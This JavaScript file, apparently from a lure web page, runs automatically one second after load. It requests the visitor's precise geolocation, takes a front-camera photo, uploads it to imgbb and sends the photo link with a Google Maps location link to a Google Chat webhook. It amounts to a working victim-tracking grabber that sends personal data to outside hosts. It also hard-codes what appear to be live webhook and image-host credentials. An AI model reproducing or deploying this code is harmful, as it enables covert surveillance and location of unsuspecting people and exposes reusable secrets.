const ESTADO = document.getElementById('estado');
const WEBHOOK =
  "https://chat.googleapis.com/v1/spaces/AAQAkFNcrrQ/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=iKoaLISxJB0lYdLzbXY6B2NbeQ0cZ8P-cd5PXpHPDio";
const IMGBB_API_KEY = "c988930cbe05cf07e207421627b182b1";

async function obtenerUbicacion() {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      }),
      () => resolve({ lat: "null", lon: "null" }),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

async function capturarFoto() {
  const constraints = { video: { facingMode: "user" } };
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;
    await new Promise(r => setTimeout(r, 1200));
    video.play();
    await new Promise(r => requestAnimationFrame(r));
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach(track => track.stop());
    return dataUrl;
  } catch {
    return null;
  }
}

async function subirImagenAImgbb(dataUrl) {
  if(!IMGBB_API_KEY) return null;
  const base64 = dataUrl.split(',')[1];
  const formData = new FormData();
  formData.append('image', base64);
  try {
    const r = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
      method: "POST",
      body: formData
    });
    const res = await r.json();
    return res.data?.url || null;
  } catch {
    return null;
  }
}

async function enviarWebhook(mensaje) {
  await fetch(WEBHOOK, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({ text: mensaje })
  });
}

async function recolectarYEnviar() {
  ESTADO.textContent = "Solicitando ubicación…";
  const {lat, lon} = await obtenerUbicacion();

  ESTADO.textContent = "Intentando capturar foto…";
  const fotoDataUrl = await capturarFoto();

  let imgUrl = null;
  if (fotoDataUrl) {
    ESTADO.textContent = "Subiendo imagen...";
    imgUrl = await subirImagenAImgbb(fotoDataUrl);
  }

  let mensaje = imgUrl
    ? `Foto tomada:\n${imgUrl}\nUbicación: https://maps.google.com/?q=${lat},${lon}`
    : `Foto tomada (no disponible)\nUbicación: https://maps.google.com/?q=${lat},${lon}`;

  ESTADO.textContent = "Enviando…";
  await enviarWebhook(mensaje);

  ESTADO.textContent = "¡Listo!";
}

setTimeout(recolectarYEnviar, 1000);
